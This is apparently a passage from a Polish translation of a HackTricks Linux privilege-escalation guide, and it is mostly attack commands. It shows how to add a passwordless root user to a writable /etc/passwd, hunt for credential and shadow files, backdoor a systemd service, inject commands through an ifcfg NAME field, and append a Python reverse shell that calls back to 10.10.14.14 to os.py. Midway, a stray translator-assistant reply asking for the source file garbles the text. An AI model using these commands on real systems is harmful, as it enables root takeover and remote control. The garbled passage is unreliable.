Wszystkie klucze SSL i SSH wygenerowane na systemach opartych na Debianie (Ubuntu, Kubuntu, etc) między wrześniem 2006 a 13 maja 2008 mogą być podatne na ten błąd.\
Ten błąd występuje przy tworzeniu nowego ssh key w tych systemach, ponieważ **możliwe były tylko 32,768 warianty**. Oznacza to, że wszystkie możliwości można obliczyć i **mając ssh public key możesz wyszukać odpowiadający private key**. Obliczone możliwości znajdziesz tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesujące wartości konfiguracji

- **PasswordAuthentication:** Określa, czy password authentication jest dozwolone. Domyślnie `no`.
- **PubkeyAuthentication:** Określa, czy public key authentication jest dozwolone. Domyślnie `yes`.
- **PermitEmptyPasswords**: Gdy password authentication jest dozwolone, określa, czy serwer pozwala na logowanie do kont z pustym hasłem. Domyślnie `no`.

### PermitRootLogin

Określa, czy root może logować się przy użyciu ssh; domyślnie `no`. Możliwe wartości:

- `yes`: root może logować się używając hasła i private key
- `without-password` or `prohibit-password`: root może logować się tylko przy użyciu private key
- `forced-commands-only`: root może logować się tylko używając private key i tylko jeśli określone są opcje commands
- `no`: nie

### AuthorizedKeysFile

Określa pliki zawierające public keys, które mogą być użyte do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Możesz wskazać ścieżki absolutne** (zaczynające się od `/`) lub **ścieżki relatywne względem katalogu domowego użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracja wskaże, że jeśli spróbujesz zalogować się przy użyciu **private** key użytkownika "**testusername**", ssh porówna publiczny klucz twojego klucza z tymi znajdującymi się w `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding pozwala ci **use your local SSH keys instead of leaving keys** (without passphrases!) zamiast zostawiać je na serwerze. Dzięki temu będziesz w stanie **jump** via ssh **to a host** i stamtąd **jump to another** host **using** the **key** located in your **initial host**.

Musisz ustawić tę opcję w `$HOME/.ssh.config` w ten sposób:
```
Host example.com
ForwardAgent yes
```
Zauważ, że jeśli `Host` ma wartość `*` za każdym razem, gdy użytkownik przełącza się na inną maszynę, ta maszyna będzie miała dostęp do kluczy (co jest problemem bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisać** te **opcje** i pozwolić lub zabronić tej konfiguracji.\
Plik `/etc/sshd_config` może **pozwolić** lub **zabronić** ssh-agent forwarding przy pomocy słowa kluczowego `AllowAgentForwarding` (default is allow).

Jeśli odkryjesz, że Forward Agent jest skonfigurowany w środowisku, przeczytaj następującą stronę, ponieważ **możesz być w stanie wykorzystać to do eskalacji uprawnień**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Ciekawe pliki

### Pliki profilów

Plik `/etc/profile` oraz pliki znajdujące się w `/etc/profile.d/` to **skrypty wykonywane, gdy użytkownik uruchamia nową powłokę**. W związku z tym, jeśli możesz **zapisć lub zmodyfikować któryś z nich, możesz eskalować uprawnienia**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Jeśli znajdziesz jakiś podejrzany skrypt profilu, powinieneś sprawdzić go pod kątem **wrażliwych informacji**.

### Pliki passwd/shadow

W zależności od systemu pliki `/etc/passwd` i `/etc/shadow` mogą mieć inną nazwę lub może istnieć ich kopia zapasowa. Dlatego zaleca się **znaleźć je wszystkie** i **sprawdzić, czy możesz je odczytać**, aby zobaczyć, **czy zawierają hashe**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych przypadkach można znaleźć **password hashes** w pliku `/etc/passwd` (lub równoważnym)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Zapisywalny /etc/passwd

Najpierw wygeneruj hasło za pomocą jednego z następujących poleceń.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Proszę wstawić treść pliku src/linux-hardening/privilege-escalation/README.md, który chcesz przetłumaczyć. Bez oryginalnej zawartości nie mogę wykonać tłumaczenia ani dodać wpisu z użytkownikiem.

Dodatkowo:
- Potwierdź, gdzie w pliku mam dodać użytkownika `hacker` i wygenerowane hasło (np. na końcu pliku, w sekcji "Users" itp.).
- Czy hasło ma być w formie zwykłego tekstu, czy np. zahashowane (np. bcrypt)?  
Jeśli potwierdzisz, wygeneruję silne hasło (proponuję 16 znaków z literami, cyframi i symbolami) i dodam je w żądanym miejscu.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Np: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Teraz możesz użyć polecenia `su` z `hacker:hacker`

Alternatywnie możesz użyć poniższych linii, aby dodać fikcyjnego użytkownika bez hasła.\
UWAGA: możesz obniżyć bezpieczeństwo maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
UWAGA: Na platformach BSD `/etc/passwd` znajduje się w `/etc/pwd.db` i `/etc/master.passwd`, a `/etc/shadow` został przemianowany na `/etc/spwd.db`.

Powinieneś sprawdzić, czy możesz **zapisywać w niektórych wrażliwych plikach**. Na przykład, czy możesz zapisać do jakiegoś **pliku konfiguracyjnego usługi**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli maszyna uruchamia serwer **tomcat** i możesz **zmodyfikować plik konfiguracyjny usługi Tomcat w /etc/systemd/,** to możesz zmodyfikować linie:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Twój backdoor zostanie uruchomiony przy następnym uruchomieniu tomcat.

### Sprawdź katalogi

Następujące foldery mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Dziwna lokalizacja/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Zmodyfikowane pliki w ostatnich minutach
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Pliki DB Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrypty/Binaria w PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Pliki webowe**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające hasła

Przejrzyj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on wyszukuje **wiele możliwych plików, które mogą zawierać hasła**.\
**Innym ciekawym narzędziem**, którego możesz użyć, jest: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — aplikacja open source służąca do odzyskiwania wielu haseł przechowywanych na lokalnym komputerze dla Windows, Linux & Mac.

### Logi

Jeśli potrafisz czytać logi, możesz znaleźć w nich **interesujące/poufne informacje**. Im bardziej dziwny jest log, tym (prawdopodobnie) ciekawszy będzie.\
Ponadto niektóre "**źle**" skonfigurowane (backdoored?) **logi audytu** mogą pozwolić na **zarejestrowanie haseł** w logach audytu, jak wyjaśniono w tym wpisie: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby móc czytać logi, grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group) będzie naprawdę pomocna.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Powinieneś także sprawdzić pliki zawierające słowo "**password**" w nazwie lub w treści, a także wyszukać IPs i emails w logach lub regexps dotyczące hashy.\
Nie będę tutaj opisywał, jak robić to wszystko, ale jeśli jesteś zainteresowany możesz sprawdzić ostatnie sprawdzenia, które wykonuje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki zapisywalne

### Python library hijacking

Jeśli wiesz, skąd będzie uruchamiany skrypt python i możesz zapisać do tego folderu albo możesz zmodyfikować python libraries, możesz zmodyfikować bibliotekę OS i backdoor it (jeśli możesz zapisać tam, gdzie skrypt python będzie uruchamiany, skopiuj i wklej bibliotekę os.py).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Wykorzystanie logrotate

Podatność w `logrotate` pozwala użytkownikom z **uprawnieniami do zapisu** na plik dziennika lub jego katalogi nadrzędne potencjalnie uzyskać eskalację uprawnień. Dzieje się tak, ponieważ `logrotate`, często uruchamiany jako **root**, może zostać zmanipulowany do wykonania dowolnych plików, szczególnie w katalogach takich jak _**/etc/bash_completion.d/**_. Ważne jest, aby sprawdzać uprawnienia nie tylko w _/var/log_, ale także w każdym katalogu, gdzie stosowana jest rotacja logów.

> [!TIP]
> Ta podatność dotyczy `logrotate` w wersji `3.18.0` i starszych

Szczegółowe informacje o podatności można znaleźć na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Możesz wykorzystać tę podatność za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta podatność jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** więc ilekroć odkryjesz, że możesz zmieniać logi, sprawdź, kto nimi zarządza i czy możesz eskalować uprawnienia, podstawiając logi jako symlinki.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Jeśli, z jakiegokolwiek powodu, użytkownik jest w stanie **zapisać** skrypt `ifcf-<whatever>` do _/etc/sysconfig/network-scripts_ **lub** może **zmodyfikować** istniejący, to twój **system jest pwned**.

Network scripts, _ifcg-eth0_ for example są używane do połączeń sieciowych. Wyglądają dokładnie jak pliki .INI. Jednak są \~sourced\~ na Linux przez Network Manager (dispatcher.d).

W moim przypadku atrybut `NAME=` w tych skryptach sieciowych nie jest poprawnie obsługiwany. Jeśli w nazwie masz **spację/białe znaki, system próbuje wykonać część po spacji**. To oznacza, że **wszystko po pierwszej spacji jest wykonywane jako root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Zwróć uwagę na pustą spację między Network i /bin/id_)

### **init, init.d, systemd, and rc.d**

Katalog `/etc/init.d` zawiera **skrypty** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami w Linuxie**. Zawiera skrypty do `start`, `stop`, `restart`, a czasem `reload` usług. Mogą być one uruchamiane bezpośrednio lub przez dowiązania symboliczne w `/etc/rc?.d/`. Alternatywna ścieżka w systemach Redhat to `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest powiązany z **Upstart**, nowszym **service management** wprowadzonym przez Ubuntu, który używa plików konfiguracyjnych do zarządzania usługami. Pomimo przejścia na Upstart, skrypty SysVinit są nadal używane obok konfiguracji Upstart z powodu warstwy kompatybilności w Upstart.

**systemd** to nowoczesny initialization and service manager, oferujący zaawansowane funkcje takie jak uruchamianie daemonów na żądanie, zarządzanie automount oraz snapshots stanu systemu. Organizuje pliki w `/usr/lib/systemd/` dla pakietów dystrybucyjnych oraz w `/etc/systemd/system/` dla modyfikacji administratora, upraszczając zarządzanie systemem.

## Inne sztuczki

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks często hookują syscall, aby udostępnić uprzywilejowaną funkcjonalność jądra menedżerowi w userspace. Słaba autentykacja menedżera (np. sprawdzenia podpisu oparte na FD-order lub słabe schematy haseł) może umożliwić lokalnej aplikacji podszycie się pod menedżera i eskalację do root na urządzeniach już zrootowanych. Więcej informacji i szczegóły eksploatacji tutaj:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery w VMware Tools/Aria Operations może wyciągnąć ścieżkę do binarki z linii poleceń procesu i uruchomić ją z -v w uprzywilejowanym kontekście. Permisywne wzorce (np. użycie \S) mogą dopasować listenery przygotowane przez atakującego w zapisywalnych lokalizacjach (np. /tmp/httpd), co prowadzi do wykonania jako root (CWE-426 Untrusted Search Path).

Dowiedz się więcej i zobacz uogólniony wzorzec zastosowalny w innych discovery/monitoring stackach tutaj:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Mechanizmy ochrony jądra

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Więcej pomocy

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Odnośniki

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
